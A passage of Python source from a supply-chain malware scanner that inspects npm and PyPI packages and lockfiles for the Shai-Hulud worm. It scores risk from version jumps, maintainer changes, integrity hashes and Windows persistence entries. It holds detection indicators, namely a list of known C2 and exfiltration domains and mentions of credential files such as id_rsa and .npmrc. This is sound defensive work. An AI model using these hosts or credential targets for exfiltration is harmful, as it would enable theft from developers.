                        if fobj:
                            raw = fobj.read().decode("utf-8", errors="replace")
                            ext = Path(member.name).suffix.lower().lstrip(".")
                            content = _strip_comments(raw, ext)
                            for desc, risk, snippet in scan_text(content):
                                findings.append((member.name, desc, risk, snippet))
                    except Exception:
                        pass
    except Exception as e:
        warn(f"Could not read tarball: {e}")
    return findings

# ═══════════════════════════════════════════════════════════════════════════════
#  COMMENT STRIPPER  (reduces pattern false-positives in code comments)
# ═══════════════════════════════════════════════════════════════════════════════
def _strip_comments(text: str, ext: str) -> str:
    """
    Rough comment removal before pattern matching.
    Reduces false positives where patterns like id_rsa or .npmrc appear
    only in developer comments or docstrings.
    """
    try:
        if ext in ("js", "ts", "mjs", "cjs", "jsx", "tsx"):
            text = re.sub(r"//[^\n]*", " ", text)
            text = re.sub(r"/\*.*?\*/", " ", text, flags=re.DOTALL)
        elif ext in ("py",):
            # Strip # comments; leave string content intact (too risky to strip docstrings)
            text = re.sub(r"#[^\n]*", " ", text)
        elif ext in ("sh", "bash", "zsh", "yml", "yaml"):
            text = re.sub(r"#[^\n]*", " ", text)
    except Exception:
        pass
    return text

# ═══════════════════════════════════════════════════════════════════════════════
#  SHARED DISTRIBUTION NOISE FILTER
# ═══════════════════════════════════════════════════════════════════════════════
# Files whose contents are always high-fidelity (never suppressed by path).
# These are the actual code that executes on `pip install` / `npm install`.
_SETUP_FILES = (
    "setup.py", "pyproject.toml", "setup.cfg",
    "package.json", "install.js", "preinstall.js", "postinstall.js",
)

# Non-executing directories: code here does NOT run during package install.
# Tests, CI pipelines, and fixtures fall here. A CRITICAL pattern in one of
# these is far lower real risk → demote CRITICAL→HIGH (stays visible, no hard
# 100-block on a legit package), suppress everything below CRITICAL.
# Covers multiple CI conventions: GitHub Actions, CircleCI, Travis, AppVeyor,
# MongoDB Evergreen, Azure Pipelines, Buildkite, GitLab CI, TeamCity.
_NOEXEC_DIRS = (
    # tests / fixtures
    "/test/", "/tests/", "/__tests__/", "/spec/", "/test_", "/fixtures/",
    "/mocks/", "/stubs/",
    # CI / build pipelines (don't run on install)
    "/.github/", "/.circleci/", "/.travis", "/appveyor", "/ci/",
    "/.evergreen/", "/.azure-pipelines/", "/.buildkite/", "/.gitlab/",
    "/.teamcity/", "/.azure/",
)

# Root-level CI config FILES (basename match). Same treatment as _NOEXEC_DIRS:
# these define CI pipelines, they do not execute during `pip/npm install`.
# (matplotlib ships azure-pipelines.yml at the package root, etc.)
_NOEXEC_FILES = (
    "azure-pipelines.yml", "azure-pipelines.yaml",
    ".travis.yml", ".travis.yaml", "appveyor.yml", "appveyor.yaml",
    ".gitlab-ci.yml", ".gitlab-ci.yaml", ".circleci.yml",
    "tox.ini", "noxfile.py", "conftest.py",
)

# Soft-noise directories: docs, examples, vendored deps, and dev/release
# tooling. `/tools/` holds scripts shipped in the sdist but NOT run on install
# (matplotlib `tools/gh_api.py`, numpy/scipy/pandas release helpers). Vendored
# code CAN be imported and executed, so these get a milder one-level demotion
# (HIGH→MEDIUM, MEDIUM→LOW) and CRITICAL still passes through.
_NOISE_DIRS = (
    "/doc/", "/docs/", "/_static/", "/examples/", "/demo/", "/tools/",
    "/vendor/", "/vendored/", "/third_party/", "/thirdparty/", "/external/",
)

def _distrib_noise_filter(
    filepath: str,
    risk_level: str,
) -> str:
    """
    Return the effective risk level for a distribution finding.

    Rules (precedence order):
    1. Install-time files (setup.py, package.json, postinstall.js…) keep their
       risk verbatim — these are the actual code that runs on install.
    2. Non-executing dirs (tests AND CI pipelines — /tests/, /.github/,
       /.evergreen/, …): code here does NOT run during `pip/npm install`.
       Demote CRITICAL→MEDIUM (still visible at +4, but cannot accumulate into a
       false "do-not-install" verdict on a legit package whose tests/CI spawn
       shells — e.g. Pillow's screen-grab test, pymongo's Evergreen scripts,
       virtualenv's .pth-creation tests), and suppress everything below CRITICAL
       to LOW.
    3. CRITICAL outside non-executing dirs always passes through.
    4. Soft-noise dirs (docs, examples, vendored): demote one level
       (HIGH→MEDIUM, MEDIUM→LOW). CRITICAL stays (vendored code can execute).
       Caller suppresses LOW.

    Rationale (see docs/DESIGN.md § 2.5): the worm executes via lifecycle
    scripts and setup.py, never via test or CI files. If a payload hides in a
    test file, the setup.py / lifecycle script that triggers it is a _SETUP_FILE
    scanned at FULL severity (never demoted) — so the real execution trigger is
    always caught. A CRITICAL pattern in a non-executing file is therefore far
    lower real risk; demoting to MEDIUM keeps it visible without letting test
    noise hard-block a legitimate top-50 package (which erodes trust and causes
    alert fatigue).
    """
    fp = filepath.lower().replace("\\", "/")
    basename = fp.rsplit("/", 1)[-1]
    is_setup  = any(basename == sf for sf in _SETUP_FILES)
    in_noexec = any(nd in fp for nd in _NOEXEC_DIRS) or basename in _NOEXEC_FILES

    # 1. Install-time files keep their risk verbatim.
    if is_setup:
        return risk_level
    # 2. Non-executing dirs (tests + CI): demote CRITICAL→MEDIUM, suppress the rest.
    if in_noexec:
        if risk_level == "CRITICAL":
            return "MEDIUM"
        return "LOW"
    # 3. CRITICAL outside non-executing dirs always passes through.
    if risk_level == "CRITICAL":
        return "CRITICAL"
    # 4. Soft-noise dirs: demote one level.
    in_noise = any(nd in fp for nd in _NOISE_DIRS)
    if not in_noise:
        return risk_level
    if risk_level == "HIGH":
        return "MEDIUM"
    if risk_level == "MEDIUM":
        return "LOW"  # caller will suppress LOW
    return risk_level

# ═══════════════════════════════════════════════════════════════════════════════
#  VERSION / MAINTAINER HEURISTICS  (true-positive amplifiers)
# ═══════════════════════════════════════════════════════════════════════════════
def _prev_version_npm(meta: dict, current_version: str) -> Optional[str]:
    """
    Return the most recent STABLE version published before current_version.

    Pre-release / experimental versions (those with a SemVer pre-release tag,
    e.g. `0.0.0-experimental-be229c565-20220613`, `2.0.0-rc.1`, `1.0.0-beta`)
    are skipped as comparison baselines: their maintainer sets and version
    numbers differ from the stable line and produce false maintainer-drift /
    version-gap findings (e.g. react-dom@18.2.0 vs an experimental snapshot).
    If current_version is itself a pre-release we still allow a pre-release
    predecessor so the heuristic isn't blinded on pre-release-only packages.
    """
    time_data    = meta.get("time", {})
    all_versions = meta.get("versions", {})
    timed = [(v, t) for v, t in time_data.items()
             if v in all_versions and v not in ("created", "modified")]
    timed.sort(key=lambda x: x[1])
    lst = [v for v, _ in timed]
    try:
        idx = lst.index(current_version)
    except ValueError:
        return None
    current_is_prerelease = "-" in current_version
    for j in range(idx - 1, -1, -1):
        cand = lst[j]
        if current_is_prerelease or "-" not in cand:
            return cand
    return None


def _parse_semver(v: str) -> Tuple[int, int, int]:
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)", v)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return (-1, -1, -1)


def check_maintainer_change(
    meta: dict, current_version: str
) -> List[Tuple[str, str]]:
    """
    Compare maintainers of current_version vs previous version.
    Returns list of (description, risk_level).
    """
    findings = []
    prev = _prev_version_npm(meta, current_version)
    if not prev:
        return findings
    all_versions = meta.get("versions", {})
    curr_m = {m.get("name", "") for m in all_versions.get(current_version, {}).get("maintainers", [])}
    prev_m = {m.get("name", "") for m in all_versions.get(prev, {}).get("maintainers", [])}
    new_m  = curr_m - prev_m
    gone_m = prev_m - curr_m
    if new_m:
        # MEDIUM not HIGH: a newly-added maintainer IS the worm's vector (account
        # compromise → publish), but it is also extremely common in healthy
        # projects (e.g. react-dom 18.1.0→18.2.0 legitimately added 'gnoff').
        # Worth surfacing, not worth a HIGH alarm on its own — combine with other
        # signals (publish age, non-registry deps, payload patterns) for severity.
        findings.append((
            f"New maintainer(s) added in {current_version} vs {prev}: {', '.join(sorted(new_m))}",
            "MEDIUM",
        ))
    if gone_m:
        findings.append((
            f"Maintainer(s) removed in {current_version} vs {prev}: {', '.join(sorted(gone_m))}",
            "LOW",
        ))
    return findings


def check_version_gap(
    meta: dict, current_version: str
) -> Optional[Tuple[str, str]]:
    """
    Detect anomalous version jumps (Shai-Hulud used e.g. 1.120.x → 1.169.5).
    Returns (description, risk_level) or None.
    """
    prev = _prev_version_npm(meta, current_version)
    if not prev:
        return None
    c = _parse_semver(current_version)
    p = _parse_semver(prev)
    if c[0] < 0 or p[0] < 0:
        return None
    # Major bump is always intentional
    if c[0] != p[0]:
        return None
    minor_jump = c[1] - p[1]
    patch_jump = c[2] - p[2] if c[1] == p[1] else 0
    if minor_jump > 30 or patch_jump > 500:
        return (
            f"Anomalous version jump: {prev} → {current_version} "
            f"(Shai-Hulud used similar inflated patch/minor numbers)",
            "HIGH",
        )
    if minor_jump > 10 or patch_jump > 100:
        return (
            f"Large version jump: {prev} → {current_version} — verify changelog",
            "MEDIUM",
        )
    return None


def check_new_dependencies(
    meta: dict, current_version: str
) -> List[Tuple[str, str]]:
    """
    Diff dependencies vs previous version.
    New non-registry or suspicious-named deps are HIGH; any new dep is LOW for awareness.
    Returns list of (description, risk_level).
    """
    findings = []
    prev = _prev_version_npm(meta, current_version)
    if not prev:
        return findings
    all_versions = meta.get("versions", {})
    curr_deps = all_versions.get(current_version, {}).get("dependencies", {})
    prev_deps = all_versions.get(prev, {}).get("dependencies", {})
    new_deps  = {k: v for k, v in curr_deps.items() if k not in prev_deps}
    if not new_deps:
        return findings
    for dep, spec in new_deps.items():
        git_prefixes = ("git+", "git://", "github:", "bitbucket:", "file:", "http://", "https://")
        if any(spec.startswith(p) for p in git_prefixes):
            findings.append((
                f"New non-registry dependency in {current_version}: {dep}: {spec}",
                "HIGH",
            ))
        else:
            findings.append((
                f"New dependency added in {current_version} vs {prev}: {dep}@{spec}",
                "LOW",
            ))
    return findings

# ═══════════════════════════════════════════════════════════════════════════════
#  PYPI ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════
def fetch_pypi_meta(name: str, version: Optional[str] = None) -> Optional[dict]:
    """Fetch package metadata from the PyPI JSON API."""
    enc_name = urllib.parse.quote(name, safe="")
    if version:
        url = f"{PYPI_BASE}/{enc_name}/{urllib.parse.quote(version, safe='')}/json"
    else:
        url = f"{PYPI_BASE}/{enc_name}/json"
    return fetch_json(url)


def scan_wheel_bytes(wheel_bytes: bytes) -> List[Tuple[str, str, str, str]]:
    """
    Scan a .whl file (zip format) for malicious patterns.
    Returns same format as scan_tarball_bytes: (filepath, desc, risk, snippet).
    """
    findings = []
    text_extensions = {".py", ".txt", ".cfg", ".toml", ".sh", ".bash", ".json", ".pth", ".ini"}
    try:
        with zipfile.ZipFile(io.BytesIO(wheel_bytes)) as zf:
            for name in zf.namelist():
                suffix = Path(name).suffix.lower()
                if suffix in text_extensions:
                    try:
                        raw = zf.read(name).decode("utf-8", errors="replace")
                        content = _strip_comments(raw, suffix.lstrip("."))
                        for desc, risk, snippet in scan_text(content):
                            findings.append((name, desc, risk, snippet))
                    except Exception:
                        pass
    except Exception as e:
        warn(f"Could not read wheel file: {e}")
    return findings


def _check_pip_packages() -> List[Tuple[str, str, str]]:
    """
    Query the current Python environment via 'pip list --format=json' and
    cross-reference against KNOWN_BAD PyPI packages.
    Returns list of (package_name, installed_version, waves_string).
    """
    hits: List[Tuple[str, str, str]] = []
    try:
        r = subprocess.run(
            [sys.executable, "-m", "pip", "list", "--format=json"],
            capture_output=True, text=True, timeout=20, errors="replace"
        )
        if r.returncode != 0 or not r.stdout.strip():
            return hits
        installed = json.loads(r.stdout)
        for pkg in installed:
            name_lower    = pkg.get("name", "").lower().replace("-", "_")
            version_str   = pkg.get("version", "")
            for known_name, known_data in KNOWN_BAD.items():
                if known_name.startswith("@"):
                    continue  # npm scoped package — skip for pip check
                if known_name.lower().replace("-", "_") == name_lower:
                    if known_data["bad"] and version_str in known_data["bad"]:
                        hits.append((pkg["name"], version_str, ", ".join(known_data["waves"])))
    except FileNotFoundError:
        pass  # pip not available in this environment
    except Exception as e:
        warn(f"pip list check failed: {e}")
    return hits


def run_pypi_check(package_spec: str) -> None:
    """
    Pre-install safety analysis for a PyPI package.
    Accepts: name, name==version, name@version
    """
    head(f"PYPI PRE-INSTALL ANALYSIS: {package_spec}")

    # Parse spec — support name==version (pip style) and name@version (our style)
    requested_version: Optional[str] = None
    if "==" in package_spec:
        pkg_name, requested_version = package_spec.split("==", 1)
    elif "@" in package_spec:
        pkg_name, requested_version = package_spec.rsplit("@", 1)
    else:
        pkg_name = package_spec
    pkg_name = pkg_name.strip()
    if requested_version:
        requested_version = requested_version.strip()

    info(f"Package : {pkg_name}")
    info(f"Version : {requested_version or 'latest'}")
    info(f"Registry: {PYPI_BASE}")

    risk_score = 0
    findings: List[Tuple[str, str]] = []

    # ── STEP 1: PyPI metadata ─────────────────────────────────────────────────
    subh("STEP 1/4  PyPI metadata")
    meta = fetch_pypi_meta(pkg_name, requested_version)
    if not meta:
        # Version-specific 404 — check if it's a known-bad version that was pulled
        if requested_version:
            pkg_key = pkg_name.lower().replace("-", "_")
            for known_name, known_data in KNOWN_BAD.items():
                if known_name.startswith("@"):
                    continue
                if known_name.lower().replace("-", "_") == pkg_key:
                    if known_data["bad"] and requested_version in known_data["bad"]:
                        crit(f"Version {requested_version} NOT found on PyPI — it was removed")
                        crit(f"CONFIRMED MALICIOUS: {pkg_name}=={requested_version}")
                        crit(f"Campaign waves: {', '.join(known_data['waves'])}")
                        crit("This version was actively compromised and pulled from PyPI.")
                        crit("DO NOT install from any mirror or cached source.")
                        _json_record_mode_result(
                            mode="check-pypi",
                            target=f"{pkg_name}=={requested_version}",
                            risk_score=100,
                            case=CASE_PACKAGES_ONLY,
                            confidence="DEFINITIVE",
                            findings=[Finding(
                                level="CRITICAL",
                                title=f"CONFIRMED MALICIOUS: {pkg_name}=={requested_version}",
                                detail=f"Pulled from PyPI. Waves: {', '.join(known_data['waves'])}",
                                path=f"{pkg_name}=={requested_version}",
                                score_contribution=100,
                                advisories=list(known_data.get("advisories", [])),
                            )],
                        )
                        if not _JSON_MODE:
                            sys.exit(1)
                        return
        crit(f"Cannot fetch PyPI metadata for '{pkg_name}'")
        info(f"Verify the package exists: https://pypi.org/project/{pkg_name}/")
        _json_record_mode_result(
            mode="check-pypi",
            target=f"{pkg_name}=={requested_version or 'latest'}",
            risk_score=0,
            case=CASE_UNCERTAIN,
            confidence="UNCERTAIN",
            findings=[Finding(level="INFO", title=f"PyPI metadata unreachable for {pkg_name}")],
        )
        return

    info_data = meta.get("info", {})
    actual_version = info_data.get("version", requested_version or "unknown")
    if not requested_version:
        requested_version = actual_version
        info(f"Resolved latest: {requested_version}")

    # Publish timestamp from releases dict (more reliable than info.requires_python)
    releases = meta.get("releases", {})
    release_files = releases.get(requested_version, [])
    if release_files:
        raw_ts = release_files[0].get("upload_time_iso_8601") or release_files[0].get("upload_time", "")
        if raw_ts:
            try:
                ts = raw_ts.replace("Z", "+00:00")
                if "+" not in ts:
                    ts += "+00:00"
                publish_dt  = datetime.fromisoformat(ts)
                age_hours   = (datetime.now(timezone.utc) - publish_dt).total_seconds() / 3600
                age_days    = int(age_hours // 24)
                ok(f"Published : {raw_ts[:19]}Z  ({age_days}d {int(age_hours % 24)}h ago)")
                if age_hours < 6:
                    crit(f"Published {int(age_hours)}h ago — CRITICAL risk window")
                    risk_score += 40
                    findings.append(("CRITICAL", f"Published only {int(age_hours)}h ago"))
                elif age_hours < 24:
                    warn(f"Published {int(age_hours)}h ago — active risk window")
                    risk_score += 25
                    findings.append(("HIGH", f"Published {int(age_hours)}h ago (24h risk window)"))
                elif age_days < 7:
                    warn(f"Published {age_days}d ago — below 7-day release-age heuristic")
                    risk_score += 10
                    findings.append(("MEDIUM", f"Published {age_days}d ago"))
                else:
                    ok("Package age exceeds 7-day minimum release age heuristic")
            except Exception:
                warn("Could not parse publish timestamp")

    author = info_data.get("author") or info_data.get("author_email") or ""
    if author:
        ok(f"Author : {author[:80]}")
    ok(f"Total versions: {len(releases)}")

    # ── STEP 2: Known-bad version ─────────────────────────────────────────────
    subh("STEP 2/4  Known compromised version database")
    pkg_key = pkg_name.lower().replace("-", "_")
    matched: Optional[Tuple[str, dict]] = None
    for known_name, known_data in KNOWN_BAD.items():
        if known_name.startswith("@"):
            continue
        if known_name.lower().replace("-", "_") == pkg_key:
            matched = (known_name, known_data)
            break

    if matched:
        name_, data = matched
        if data["bad"] and requested_version in data["bad"]:
            crit(f"CONFIRMED COMPROMISED: {pkg_name}=={requested_version}")
            crit(f"Campaign waves: {', '.join(data['waves'])}")
            crit("DO NOT INSTALL.")
            risk_score += 100
            findings.append(("CRITICAL", f"Confirmed compromised version ({', '.join(data['waves'])})"))
        else:
            warn(f"{pkg_name} is a known Shai-Hulud high-value target")
            warn(f"Version {requested_version} not confirmed bad, but apply heightened scrutiny")
            risk_score += 15
            findings.append(("MEDIUM", "Package is a known repeated Shai-Hulud target"))
    else:
        ok("Package not in known-compromised list")
    dim(f"Known-bad list lags → cross-check: {IOC_REPO}")

    # ── STEP 3: Package metadata pattern scan ─────────────────────────────────
    subh("STEP 3/4  Package metadata pattern scan  (description, summary, keywords)")
    kws = info_data.get("keywords") or ""
    if isinstance(kws, list):
        kws = " ".join(kws)
    meta_text = " ".join(filter(None, [
        info_data.get("summary", ""),
        (info_data.get("description", "") or "")[:2000],
        kws,
    ]))
    meta_hits = scan_text(meta_text)
    if meta_hits:
        for desc, risk, snippet in meta_hits:
            fn = crit if risk == "CRITICAL" else warn
            fn(f"{risk} in package metadata: {desc}")
            dim(f"  match: {snippet[:80]}")
            risk_score += 30 if risk == "CRITICAL" else 15 if risk == "HIGH" else 5
            findings.append((risk, f"Metadata: {desc}"))
    else:
        ok("No malicious patterns in package metadata")

    # ── STEP 4: Distribution download and scan ────────────────────────────────
    subh("STEP 4/4  Distribution download and deep-content scan  (no execution)")
    urls = meta.get("urls", [])

    # Prefer sdist (.tar.gz) for more complete source inspection
    sdist_file = next((f for f in urls if f.get("packagetype") == "sdist"), None)
    wheel_file  = next((f for f in urls if f.get("packagetype") == "bdist_wheel"), None)
    dist_file   = sdist_file or wheel_file

    if not dist_file:
        warn("No distribution files found for this version — cannot scan")
    else:
        is_wheel   = dist_file.get("packagetype") == "bdist_wheel"
        dl_url     = dist_file.get("url", "")
        sha256_exp = dist_file.get("digests", {}).get("sha256", "")
        filename   = dist_file.get("filename", dl_url.split("/")[-1])

        info(f"Downloading: {filename}")
        info(f"Type: {'wheel (.whl)' if is_wheel else 'source distribution (.tar.gz)'}")
        info("(inspected in memory — no code executed)")

        t0          = time.time()
        dist_bytes  = fetch_bytes(dl_url)
        elapsed     = time.time() - t0

        if not dist_bytes:
            warn("Download failed — skipping content scan")
        else:
            size_kb = len(dist_bytes) / 1024
            ok(f"Downloaded: {size_kb:.1f} KB in {elapsed:.1f}s")

            # SHA-256 integrity (PyPI standard — unlike npm's SHA-512)
            if sha256_exp:
                actual_sha256 = hashlib.sha256(dist_bytes).hexdigest()
                if actual_sha256 == sha256_exp:
                    ok("Distribution integrity verified (SHA-256 ✓)")
                else:
                    crit("INTEGRITY MISMATCH — SHA-256 does not match PyPI record")
                    crit("Distribution may have been tampered with at registry or in transit")
                    risk_score += 100
                    findings.append(("CRITICAL", "Distribution SHA-256 integrity check FAILED"))
            else:
                warn("No SHA-256 hash in PyPI metadata — cannot verify integrity")

            if size_kb > 5000:
                warn(f"Large distribution ({size_kb:.0f} KB) — review file list manually")
                risk_score += 5

            info("Scanning distribution contents for malicious indicators...")
            dist_findings = scan_wheel_bytes(dist_bytes) if is_wheel else scan_tarball_bytes(dist_bytes)

            # Path-based noise filter (shared with the npm tarball path — see
            # _distrib_noise_filter): demotes findings from test/doc/CI/vendored
            # paths. Test dirs demote CRITICAL→HIGH (files there don't run on
            # install) and suppress the rest; other noise dirs demote one level.
            filtered_findings = []
            seen_descs: set = set()
            for filepath, desc, risk, snippet in dist_findings:
                eff = _distrib_noise_filter(filepath, risk)
                if eff == "LOW" and eff != risk:
                    continue  # suppressed by noise filter
                dedup_key = (desc, eff)
                if dedup_key in seen_descs:
                    continue
                seen_descs.add(dedup_key)
                filtered_findings.append((filepath, desc, eff, snippet))

            if filtered_findings:
                for filepath, desc, risk, snippet in filtered_findings:
                    fn = crit if risk == "CRITICAL" else warn
                    fn(f"{risk} in {filepath}")
                    fn(f"   → {desc}")
                    if snippet and snippet != Path(filepath).name:
                        dim(f"   match: {snippet[:100]}")
                    risk_score += 50 if risk == "CRITICAL" else 20 if risk == "HIGH" else 4
                    findings.append((risk, f"In {filepath}: {desc}"))
            else:
                ok("No malicious patterns detected in distribution contents")
            if dist_findings and not filtered_findings:
                ok("All distribution findings were in test/doc/CI paths — suppressed as noise")

    # ── Risk report ───────────────────────────────────────────────────────────
    head("PYPI PRE-INSTALL RISK REPORT")
    info(f"Package: {pkg_name}=={requested_version}")
    capped = min(risk_score, 100)
    if capped == 0:
        ok("Risk score: 0/100 — No indicators found")
        ok("Proceed — but read limitations below before running pip install")
    elif capped < 15:
        ok(f"Risk score: {capped}/100 — Low risk")
        info("Manual review of findings recommended before install")
    elif capped < 40:
        warn(f"Risk score: {capped}/100 — Moderate risk — verify independently")
        warn("Consider using pip-audit or safety before installing in production")
    elif capped < 70:
        warn(f"Risk score: {capped}/100 — High risk — do not install without investigation")
    else:
        crit(f"Risk score: {capped}/100 — CRITICAL — do not install")

    if findings:
        print()
        info("Findings summary:")
        for level, msg in findings:
            (crit if level == "CRITICAL" else warn if level in ("HIGH", "MEDIUM")
             else info)(f"  [{level}]  {msg}")

    subh("Safe install workflow (if proceeding)")
    print(f"""
     # Step A — download without installing (pip 22.2+)
     pip download {pkg_name}=={requested_version} --no-deps -d /tmp/pypi_inspect/
     # Step B — list files in the downloaded archive
     tar tzf /tmp/pypi_inspect/{pkg_name}*.tar.gz | head -40
     # Step C — check setup.py / pyproject.toml for hooks
     tar xOf /tmp/pypi_inspect/{pkg_name}*.tar.gz --wildcards "*/setup.py" 2>/dev/null | head -60
     # Step D — install with reduced build isolation (limits some setup.py vectors)
     pip install {pkg_name}=={requested_version} --no-build-isolation
     # Note: pip has no --ignore-scripts equivalent. Use a virtual environment
     # and inspect site-packages after install before using in production.
    """)

    subh("Limitations of this tool (PyPI)")
    dim("• pip has no --ignore-scripts equivalent — setup.py always executes on build")
    dim("• --no-build-isolation reduces but does not eliminate setup.py risk")
    dim("• Novel obfuscation and dynamic imports can evade pattern matching")
    dim("• Wheel files (.whl) contain pre-built code — setup.py does NOT run at install time")
    dim("• Known-bad list is manually maintained and lags zero-day variants")
    dim(f"• Cross-check IOC list: {IOC_REPO}")
    print()
    # JSON sink: capture findings for --json mode (skipped silently otherwise)
    _adv_lookup = {pkg_name: KNOWN_BAD.get(pkg_name, {}).get("advisories", [])} if pkg_name in KNOWN_BAD else None
    _json_record_mode_result(
        mode="check-pypi",
        target=f"{pkg_name}=={requested_version}",
        risk_score=capped,
        case=CASE_CLEAN if capped == 0 else CASE_UNCERTAIN,
        confidence="DEFINITIVE" if capped == 0 else ("HIGH" if capped >= 70 else "MEDIUM" if capped >= 40 else "LOW"),
        findings=findings,
        advisory_lookup=_adv_lookup,
    )
    if capped >= 40 and not _JSON_MODE:
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
#  PACKAGE-LOCK.JSON DEEP ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════
def _lockfile_packages(lock: dict) -> Dict[str, dict]:
    """Flatten lockfile v1/v2/v3 into a uniform {pkg_name: meta} dict."""
    version = lock.get("lockfileVersion", 1)
    if version >= 2 and "packages" in lock:
        result = {}
        for key, val in lock["packages"].items():
            if not key:  # root package entry
                continue
            # Strip leading node_modules/ prefix (handles nested scoped packages)
            name = re.sub(r"^(node_modules/)+", "", key)
            result[name] = val
        return result
    # v1: nested dependencies dict
    result: Dict[str, dict] = {}
    def _flatten(deps: dict) -> None:
        for name, meta in deps.items():
            result[name] = meta
            if "dependencies" in meta:
                _flatten(meta["dependencies"])
    _flatten(lock.get("dependencies", {}))
    return result


def scan_lockfile(project_path: Path) -> Tuple[List[dict], int]:
    """
    Deep analysis of package-lock.json.
    Returns (findings_list, critical_count).
    Each finding: {"level": str, "msg": str, "pkg": str, "detail": str}
    """
    lock_path = project_path / "package-lock.json"
    findings: List[dict] = []
    critical_count = 0

    if not lock_path.exists():
        return findings, critical_count

    try:
        lock = json.loads(lock_path.read_text(encoding="utf-8", errors="replace"))
    except Exception as e:
        findings.append({"level": "HIGH", "msg": f"Cannot parse package-lock.json: {e}",
                         "pkg": "", "detail": ""})
        return findings, critical_count

    packages = _lockfile_packages(lock)

    # Known-C2 domains to escalate non-registry findings to CRITICAL
    _c2_domains = ("git-tanstack", "webhook.site", "getsession", "oxen.io")

    for pkg_name, meta in packages.items():
        resolved  = meta.get("resolved", "")
        integrity = meta.get("integrity", "")
        version   = meta.get("version", "")

        # ① Non-registry resolved URL
        if resolved and "registry.npmjs.org" not in resolved and not resolved.startswith("file:"):
            lvl = "CRITICAL" if any(d in resolved for d in _c2_domains) else "HIGH"
            findings.append({"level": lvl,
                             "msg":   f"Non-registry resolved URL: {pkg_name}",
                             "pkg":   pkg_name,
                             "detail": resolved[:120]})
            if lvl == "CRITICAL":
                critical_count += 1

        # ② Missing integrity on registry package
        if not integrity and resolved and "registry.npmjs.org" in resolved:
            findings.append({"level": "MEDIUM",
                             "msg":   f"Missing integrity hash: {pkg_name}",
                             "pkg":   pkg_name,
                             "detail": "Expected sha512- SRI hash absent"})

        # ③ Unexpected integrity format (not sha512- or legacy sha1-)
        if integrity and not integrity.startswith(("sha512-", "sha1-")):
            findings.append({"level": "HIGH",
                             "msg":   f"Unexpected integrity format: {pkg_name}",
                             "pkg":   pkg_name,
                             "detail": f"integrity: {integrity[:80]}"})

        # ④ Known-bad version cross-reference
        for known_name, known_data in KNOWN_BAD.items():
            if pkg_name == known_name or pkg_name.endswith(f"/{known_name.lstrip('@')}"):
                if known_data["bad"] and version in known_data["bad"]:
                    findings.append({"level": "CRITICAL",
                                     "msg":   f"CONFIRMED BAD VERSION in lockfile: {pkg_name}@{version}",
                                     "pkg":   pkg_name,
                                     "detail": f"Waves: {', '.join(known_data['waves'])}"})
                    critical_count += 1

        # ⑤ Lifecycle scripts embedded in lockfile (v2/v3 format)
        for hook in ("preinstall", "install", "postinstall", "prepare"):
            cmd = meta.get("scripts", {}).get(hook)
            if cmd:
                for desc, risk, _snippet in scan_text(cmd):
                    findings.append({"level": risk,
                                     "msg":   f"Suspicious [{hook}] in {pkg_name}: {desc}",
                                     "pkg":   pkg_name,
                                     "detail": cmd[:100]})
                    if risk == "CRITICAL":
                        critical_count += 1

    return findings, critical_count

# ═══════════════════════════════════════════════════════════════════════════════
#  WINDOWS PERSISTENCE DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
def check_windows_persistence() -> List[str]:
    """Query Task Scheduler and Startup folder for Shai-Hulud persistence entries."""
    if platform.system().lower() != "windows":
        return []
    found = []
    try:
        r = subprocess.run(["schtasks", "/query", "/fo", "LIST"],
                           capture_output=True, text=True, timeout=20, errors="replace")
        for line in r.stdout.splitlines():
            if line.strip().lower().startswith("taskname:"):
                task = line.split(":", 1)[1].strip()
                if any(kw in task.lower() for kw in WINDOWS_TASK_KEYWORDS):
                    found.append(f"Task Scheduler: {task}")
    except FileNotFoundError:
        pass  # schtasks not available
    except Exception as e:
        warn(f"Task Scheduler query failed: {e}")

    # Check current user Startup folder
    try:
        startup = (Path(os.environ.get("APPDATA", "")) /
                   "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup")
        if startup.exists():
            for f in startup.iterdir():
                if any(kw in f.name.lower() for kw in WINDOWS_TASK_KEYWORDS):
                    found.append(f"Startup folder: {f.name}")
    except Exception:
        pass

    return found

# ═══════════════════════════════════════════════════════════════════════════════
#  INFECTION CASE CLASSIFIER
# ═══════════════════════════════════════════════════════════════════════════════
def classify_infection(
    daemon_found: bool,
    bad_pkg_count: int,
    lockfile_critical: int,
    pattern_hits: int,
    total_findings: int,
) -> Tuple[str, str]:
    """
    Returns (case_constant, confidence_string).
    confidence: DEFINITIVE | HIGH | MEDIUM | LOW | UNCERTAIN
    """
    if daemon_found and (bad_pkg_count > 0 or lockfile_critical > 0):
        return CASE_FULL_COMPROMISE, "DEFINITIVE"
    if daemon_found:
        return CASE_DAEMON_ONLY, "DEFINITIVE"
    if bad_pkg_count > 0 and lockfile_critical > 0:
        return CASE_PACKAGES_ONLY, "HIGH"
    if lockfile_critical > 0:
        return CASE_LOCKFILE_TAMPER, "HIGH"
    if bad_pkg_count > 0:
        return CASE_PACKAGES_ONLY, "HIGH"
    if pattern_hits >= 3:
        return CASE_LOW_CONFIDENCE, "MEDIUM"
    if pattern_hits >= 1 or total_findings >= 2:
        return CASE_UNCERTAIN, "LOW"
    return CASE_CLEAN, "DEFINITIVE"

# ═══════════════════════════════════════════════════════════════════════════════
#  REMEDIATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
def _run(argv: List[str], cwd: Optional[Path] = None, timeout: int = 60) -> bool:
    """Execute ONE command as an argument vector — ``shell=False``, injection-proof (§5.8).

    Best-effort: never raises. ``capture_output`` swallows stdout/stderr (replaces
    the old shell ``2>/dev/null``); a non-zero exit is logged and tolerated
    (replaces the old ``|| true``). Returns True only on exit code 0.
    """
    printable = " ".join(argv)
    info(f"Running: {printable}")
    try:
        r = subprocess.run(argv, shell=False, capture_output=True, text=True,
                           cwd=str(cwd) if cwd else None,
                           timeout=timeout, errors="replace")
    except Exception as e:
        warn(f"  Failed: {e}")
        return False
    if r.returncode == 0:
        ok(f"  OK: {printable[:60]}")
        return True
    warn(f"  Exit {r.returncode}: {(r.stderr or r.stdout or '').strip()[:180]}")
    return False


def _execute_cmds(cmds: List[List[str]], label: str, cwd: Optional[Path] = None) -> bool:
    """Execute argument-vector commands sequentially (``shell=False``, §5.8).

